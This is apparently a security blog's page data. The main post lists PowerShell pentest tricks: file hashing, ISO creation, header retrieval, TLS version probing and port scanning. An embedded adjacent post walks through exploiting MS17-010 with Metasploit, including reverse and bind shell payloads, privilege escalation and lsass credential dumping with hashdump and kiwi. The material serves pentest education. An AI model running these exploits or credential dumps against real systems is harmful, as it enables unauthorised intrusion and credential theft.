{"componentChunkName":"component---src-templates-blog-post-js","path":"/articles/5-uses-for-power-shell-on-pentests/","result":{"pageContext":{"post":{"fields":{"slug":"/5-uses-for-power-shell-on-pentests"},"excerpt":null,"frontmatter":{"date":"15th April 2021 ","title":"5 Uses for PowerShell on Pentests","description":"Five ways of using PowerShell on your pentests.","tags":"powershell","posttype":"article"},"body":"## 1, Checking for duplicate files\n\nFinding duplicate files can be a tricky task, especially when you have 100's of files spread all over your hard drive.  An easy way is to compute the checksum of the files you would like to check and compare them. If we generate checksums for two files, we can declare that the two files aren’t duplicates if the checksums are different. If the checksums are equal, we can claim that the files are identical, considering that getting the same hash for two different files is almost impossible.\n\nCollisions can occur with Sha1 and MD5, so it is recommended you either double-check with both algorithms (as a collision on both will be unlikely) or use an algorithm such as Sha512.\n\nWe can use the following function to get the checksum of any file. \n\n```powershell\nGet-FileHash -Algorithm sha1 file.txt\n```\n\nThe `Get-FileHash` algorithm attribute supports the following:\n\n- SHA1 (160 bits)\n- SHA256 (256 bits)\n- SHA384 (384 bits)\n- SHA512 (512 bits)\n- MACTripleDES (64 bits)\n- MD5 (128 bits)\n- RIPEMD160 (160 bits)\n\n<img src=\"/static/ea89c0fc-5aea-4f88-9257-4ca0e3121921.png\" class=\"img-fluid\" alt=\"untitled\">\n\n\n## 2 Create ISO files\n\n### What are ISO files?\n\nISOs are a type of archive. The easiest way to think of an ISO file is more like a .zip or .cab archive file, only without the compression. An ISO file contains the image of a disk. That means it contains all the files and folders on that disk, much like a .zip or .cab file containing a collection of files and folders.\n\n### What are some of the benefits of ISO files.\n\n- Chances of getting viruses in your file are reduced.\n- Chances of your data being corrupt are reduced after creating an ISO file.\n- A single ISO file can hold a whole batch of files and tools.\n\nUsing the code, we can find it at the following location. We can create an ISO file for storing tools and documents inside and mounting them inside our virtual machines. \n\n[New-ISOFile function](https://gallery.technet.microsoft.com/scriptcenter/New-ISOFile-function-a8deeffd)\n\nTo make the script easier to call, we will put it in our profile. See the following link for more information about PowerShell profiles and the appropriate location.\n\n[https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.1#the-profile-files](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.1#the-profile-files)\n\n```powershell\nNew-Item -ItemType Directory $Home\\Documents\\PowerShell\\\nNew-Item $Home\\Documents\\PowerShell\\Profile.ps1\nnotepad $Home\\Documents\\PowerShell\\Profile.ps1\n```\n\n<img src=\"/static/b997e7f9-e47c-4b85-8ca3-7973dd4dd150.png\" class=\"img-fluid\" alt=\"untitled\">\n\nWith the function saved in our profile, we can now create an ISO. Let us use the text files we created earlier. \n\n```powershell\ngci * | New-ISOFile -Path textfile.iso\n```\n\n<img src=\"/static/099f6a05-4dd0-48b1-93ef-f7f18d4987d3.png\" class=\"img-fluid\" alt=\"untitled\">\n\nLets now mount the disk and boot up our VM\n\n<img src=\"/static/a1907569-7cbb-4654-8c61-749523497c25.png\" class=\"img-fluid\" alt=\"untitled\">\n\nSetting the CD player path to the path of the ISO we just created. \n\n<img src=\"/static/98a87e5c-8ad8-452d-bd90-31f5e01e3f37.png\" class=\"img-fluid\" alt=\"untitled\">\n\n\nThe drive has appeared and seems to have content in it.\n\nLet's hit `Ctrl` + `E` to open up Explorer and navigate our mounted ISO.\n\n<img src=\"/static/24ba6ce8-449c-4c35-ad9f-ebcb72de8954.png\" class=\"img-fluid\" alt=\"untitled\">\n\nOut ISO contains the three files from earlier. \n\n## 3, Using PowerShell to Show Server Response Headers\n\nUsing the `Invoke-WebRequest` or the valid and shortened `iwr`, we can retrieve interesting information. \n\nThe returned object from `Invoke-WebRequest` will allow you to see items such as the returned HTTP status code, the links on a page, the forms on the page and the returned server headers. \n\n```powershell\n$request = Invoke-WebRequest https://evilsaint.co.uk\n$request.StatusCode\n$request.Headers\n$request.RawContent > temp.html\n```\n\nWhat these Headers mean I will leave for a future article, but here is a useful reference in the mean-time:\n\n[The HTTP Response Headers List](https://flaviocopes.com/http-response-headers/)\n\n<img src=\"/static/aee90e1c-ba46-4a56-920d-9b57a75268a8.png\" class=\"img-fluid\" alt=\"untitled\">\n\nHere we can see the headers returned by the server when making a GET request to [evilsaint.com](evilsaint.com)\n\n## 4, Checking what versions of SSL/TLS the server will support\n\n```powershell\n“ssl2”, “ssl3”, “tls”, “tls11”, “tls12” | % {\n\n    $TcpClient = New-Object Net.Sockets.TcpClient\n    $TcpClient.Connect(\"evilsaint.com\", 443)\n    try {\n        $SslStream = New-Object Net.Security.SslStream $TcpClient.GetStream()\n        $SslStream.ReadTimeout = 15000\n        $SslStream.WriteTimeout = 15000\n        $SslStream.AuthenticateAsClient(\"evilsaint.com\",$null,$_,$false)\n        $KeyExhange = $SslStream.KeyExchangeAlgorithm\n        $HashAlgorithm = $SslStream.HashAlgorithm\n        $status = $true\n\n    } catch {\n        $status = $false\n    }\n\n    $TcpClient.Dispose()\n    $SslStream.Dispose()\n\n    Write-Host \"$_ = $status\"\n    #Write-Host $KeyExhange\n    #Write-Host $HashAlgorithm\n}\n```\n<img src=\"/static/ee1e0133-5cee-4894-9031-35565478119d.png\" class=\"img-fluid\" alt=\"untitled\">\n\nHere we can see that [evilsaint.com](http://evilsaint.com) does not support SSL version 2 or 3\n\n## 5, Alive Hosts And Open Port Detection\n\nWhile ideally, we would always have tools such as Nmap, Masscan and Hping3 to hand, sometimes, we just had to live-of-the-land. \n\nTo see if a host is alive, we can use `Test-NetConnection` to send an ICMP ping request. \n\n```powershell\nTest-NetConnection evilsaint.com\n```\n\nIf we specify a port, then PowerShell will attempt a TCP connect test to that port.\n\n```powershell\nTest-NetConnection [evilsaint.com](http://evilsaint.com/) -Port 443\n```\n\nWith a little scripting, we can use the Net Sockets TCP Client and loop through many ports like so\n\n```powershell\n1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect(\"[evilsaint.com](http://evilsaint.com/)\",$*)) \"Port $* is open!\"} 2>$null\n```\n\nThis can be quite a slow process.\n\n<img src=\"/static/ca18b1d9-c600-48ae-9082-fd3ecbb01b35.png\" class=\"img-fluid\" alt=\"untitled\">\n\n\nHere we can see Port 22 has been left open :-)"},"prev":{"fields":{"slug":"/auditing-cisco-network-devices"},"excerpt":"Look out for device administrative (console and aux) lines that are configured without a password. An attacker with physical access to the…","frontmatter":{"date":"15th April 2021 ","title":"Auditing Cisco Network Devices","description":"","tags":null,"posttype":"article"},"body":"\n# Administrative Line Login With No Password\n\nLook out for device administrative (console and aux) lines that are configured without a password. An attacker with physical access to the ports, or with remote modem access, would be able to access the host. Any access could lead to system compromise, packet sniffing, or denial of service.\n\nEnsure that authentication is configured on all ports. Shut down any ports that are not in use.\nThe authentication mechanism and authentication password can be configured on administrative lines using the following line mode commands:\n```\nlogin [tacacs | local]\npassword password\n```"},"next":{"fields":{"slug":"/remote-exploit-ms-17-010"},"excerpt":"This article demonstrates how to exploit the MS17-010 vulnerability with the Metasploit Framework. This article is for educational purposes…","frontmatter":{"date":"27th March 2021 ","title":"Remote Exploit MS17-010","description":"This article serves as a quick reference to exploiting the MS17-010 with the Metasploit Framework. This article is for educational purposes only.","tags":"kali-linux, metasploit, ms17-010, windows","posttype":"article"},"body":"This article demonstrates how to exploit the MS17-010 vulnerability with the `Metasploit Framework`. This article is for educational purposes only.\n\nTwo methods are demonstrated; `with` and `without compromised credentials`. This article does not discuss the vulnerability and its background.\n\n# Method 1 - MS17-010 exploitation without credentials: EternalBlue\n\n<h5 class=\"step\">Step 1 - Launch Metasploit and choose the `ms17_010_eternalblue` exploit</h5>\n\n```\nmsfconole\n[...]\nuse exploit/windows/smb/ms17_010_eternalblue\n```\n\n<h5 class=\"step\">Step 2 - Configure options for your target</h5>\n\nConfigure your exploit to run with options that are specific to your target. Note that setting the remote port is optional, this is 445 by default\n\n```\nshow targets\nset TARGET <id>\nset RHOST <target IP>\nset RPORT <target port> (445 by default)\n```\n\n<h5 class=\"step\">Step 3 - Configure options for your machine</h5>\n\nConfigure options for your machine with. \n\n```\nset LHOST <your IP>\nset LPORT <port of your choice>\n```\n\n<h5 class=\"step\">Step 4 - Optional: Configure a payload</h5>\n\nThis step is optional. By default, `windows/x64/meterpreter/reverse_tcp` is used.\n\n```\nshow PAYLOADS\n```\n\nChoose and set a payload with:\n\n```\nset PAYLOAD <payload>\n```\n\n<h5 class=\"step\">Step 5 - Exploit</h5>\n\nTo run the exploit use:\n\n```\nexploit\n```\n\nA reverse connection is initiated upon successful exploitation.\n\nFor `post-exploitation tips`, see step 6 of the below instructions.\n\n# MS17-010 Exploitation - With credentials: PSExec\n\nThis example requires credentials to run. This example is done using a domain-joined target.\n\n<h5 class=\"step\">Step 1 - Launch Metasploit and choose the `ms17_010_psexec` exploit</h5>\n\n```\nmsfconole\n[...]\nuse exploit/windows/smb/ms17_010_psexec\n```\n\n<h5 class=\"step\">Step 2 - Configure options for your target</h5>\n\nConfigure your exploit to run with options that are specific to your target. Note that setting the remote port is optional, this is 445 by default\n\n```\nshow TARGETS\nset TARGET <id>\nset RHOST <target IP>\nset RPORT <target port> (445 by default)\nset SMBUSER <user>\nset SMBPASS <password>\nset SMBDOMAIN <domain>\n```\n\n<h5 class=\"step\">Step 3 - Configure options for your machine</h5>\n\n```\nset LHOST <your IP>\nset LPORT <port of your choice>\n```\n\n<h5 class=\"step\">Step 4 - Optional: Configure a payload</h5>\n\nThis step is optional. By default, `windows/x64/meterpreter/reverse_tcp` is used.\n\n```\nshow PAYLOADS\n```\n\nChoose and set a payload with:\n\n```\nset PAYLOAD <payload>\n```\n\nFor example, to use a smaller `bind` payload (`stageless`), you can choose:\n\n```\nset PAYLOAD generic/shell_bind_tcp\n```\n\n<h5 class=\"step\">Step 5 - Exploit</h5>\n\nTo run the exploit use:\n\n```\nexploit\n```\n\n<h5 class=\"step\">Step 6 - Optional: Post-Exploitation</h5>\n\nIf you used a non-meterpreter payload, you can upgrade it to Meterpreter using:\n\n```\nCTRL + Z (background session)\nuse post/multi/manage/shell_to_meterpreter\nsessions -l\nset session <session id>\nset LHOST <your IP>\nset LPORT <port of your choice>\nexploit\n```\n\n<b>Note:</b> You may need to run this a few times to upgrade the shell.\n\nOnce you have upgraded your shell, you can escalate your privileges.\n\n```\nsession -i <meterpreter session>\ngetsystem\n```\n\nTo migrate process and dump credentials, use:\n\n```\nps\nmigrate -N lsass.exe\nhashdump\nload kiwi\ncreds_all\n```"}}},"staticQueryHashes":["310218920"],"slicesMap":{}}